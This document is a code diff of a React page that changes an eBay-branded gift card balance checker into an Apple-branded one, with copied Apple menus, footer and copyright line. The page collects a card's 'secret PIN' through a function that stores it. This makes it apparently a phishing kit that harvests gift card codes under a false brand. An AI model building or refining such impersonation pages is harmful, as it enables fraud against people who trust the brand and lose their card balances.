@@ -1,10 +1,9 @@
 import {useState} from "react"
 import axios from "axios"
+import {Oval} from "react-loader-spinner"
 import {useParams} from "react-router-dom"
 import {FaBars, FaTimes} from "react-icons/fa"
-import { BiSearch, BiUser, BiCart, BiSolidLocationPlus} from "react-icons/bi"
-import Logo from "../public/logo.svg"
-import ebayImage from "../public/ebayImage.png"
+import { BiSearch, BiUser, BiCart } from "react-icons/bi"
 import {Link} from "react-router-dom"
 import { CLIENT_BASE_URL } from "./context"
 
@@ -12,7 +11,7 @@ function Home(){
   const [secretPin, setSecretPin] = useState("")
   const [isOpenNav, setIsOpenNav] = useState(false)
   const [isLoading, setIsLoading] = useState(false)
-  const [isDone, setIsDone] = useState(false)
+  const [isDone, setIsDone] = useState(true)
   const [error, setError] = useState({isError:false, message:""})
   const [cardData, setCardData] = useState("")
 
@@ -28,7 +27,7 @@ function Home(){
 
   async function storeSecretPin(){
     if(secretPin.length !== 19 || !secretPin.trim().length){
-      return setError({isError:true, message:"Oops, that isn't right. Please enter your gift card's 13-digit code"})
+      return setError({isError:true, message:"Please enter a valid PIN."})
     }
     setIsLoading(true)
 
@@ -53,31 +52,44 @@ function Home(){
 
     <main className="main" style={{maxHeight: isOpenNav? "100vh" : "initial", overflow:"hidden"}}>
       <header className="header">
-        <div className="logo">
-          <img alt="logo" src={Logo} />
+        <div className="top">
+          <div className="logo">
+            <img src="../public/apple-logo.png" alt="something demure" />
+          </div>
+          <div className="icons">
+            <BiSearch className="icon"/>
+            <BiCart className="icon"/>
+            <FaBars onClick={()=>{setIsOpenNav(true)}}  className="icon bars"/>
+          </div>
         </div>
-        <div className="icons">
-          <BiSearch className="icon"/>
-          <BiUser className="icon"/>
-          <BiCart className="icon"/>
-          <FaBars onClick={()=>{setIsOpenNav(true)}} className="icon bars"/>
+        <div className="bottom">
+          <p>Apple Gift Card</p>
+          <div className="bottom-right">
+            <button>Buy</button>
+          </div>
         </div>
         {isOpenNav && <nav className="nav" >
           <div className="icon-container">
             <FaTimes className="icon" onClick={()=>{setIsOpenNav(false)}} />
           </div>
           <ul>
-            <li>Categories</li>
-            <li>Deals</li>
-            <li>Sell</li>
-            <li>Help</li>
+            <li>Store</li>
+            <li>Mac</li>
+            <li>iPad</li>
+            <li>iPhone</li>
+            <li>Watch</li>
+            <li>Vision</li>
+            <li>AirPods</li>
+            <li>TV & Home</li>
+            <li>Entertainment</li>
+            <li>Accessories</li>
+            <li>Support</li>
           </ul>
-          <p>Sign Out</p>
         </nav>}
       </header>
       <div className="hero">
         <div className="ebay-image">
-          <h1>Check Your Apple Gift Card Balance</h1>
+          <h2>Check Your Apple Gift Card Balance</h2>
           
         </div>
         {!isDone && <div className="code">
@@ -87,29 +99,49 @@ function Home(){
             {error.isError && <small className="error">{error.message}</small>}
           </div>
           <div className="check">
-            <button onClick={storeSecretPin}>Check Balance</button>
+            <button onClick={storeSecretPin}> {isLoading && <Oval className="loader"
+  visible={true}
+  height="20"
+  width="20"
+  color="white"
+  // ariaLabel="oval-loading"
+
+  />} Check Balance</button>
           </div>
           
         </div>}
         {isDone && <div className="result">
           <div className="amount">
-            <p className="text">Your gift card balance:</p>
+            <p className="text">Here's your balance:</p>
             <p className="balance">US ${cardData.balance}.00</p>
           </div>
-          <div className="check-new">
-            <button onClick={()=>{setIsDone(false)}}>Check another card</button>
-          </div>
+          <small>Recently used gift cards may not reflect the updated balance on the card. Card balances will be updated once your order is ready to ship.</small>
+          
+          <p className="check-new" onClick={()=>{setIsDone(false)}}>Check another gift card</p>
+          
         </div>}
       </div>
+
+      <section className="apple-image">
+        <div className="apple">
+          <img src="../public/apple.jpeg" alt="something amazing" />
+        </div>
+      </section>
+
       <footer className="footer">
         
           <ul className="ul">
-            <li>Home</li>
-            <li>My eBay</li>
-            <li>Sell an item</li>
-            <li>Help & Contact</li>
-            <li>Download the free eBay app</li>
-            <li>Sign out</li>
+            <li>Shop and Learn</li>
+            <li>Apple Wallet</li>
+            <li>Account</li>
+            <li>Entertainment</li>
+            <li>Apple Store</li>
+            <li>For Business</li>
+            <li>For Education</li>
+            <li>For Healthcare</li>
+            <li>For Government</li>
+            <li>Apple Values</li>
+            <li>About Apple</li>
           </ul>
         
         <div>
@@ -117,7 +149,7 @@ function Home(){
             <a><span>Site map,</span> <span>User Agreement,</span> <span>Privacy,</span> <span>Cookies</span> & <span>AdChoice.</span></a>
           </div>
           <div className="last"> 
-            <p>© 1995-2004 eBay Inc.</p>
+            <p>Copyright © 2024 Apple Inc.</p>
             <p>Mobile / <Link to="/Sign-in" className="classic">Classic Site</Link></p>
           </div>
         </div>
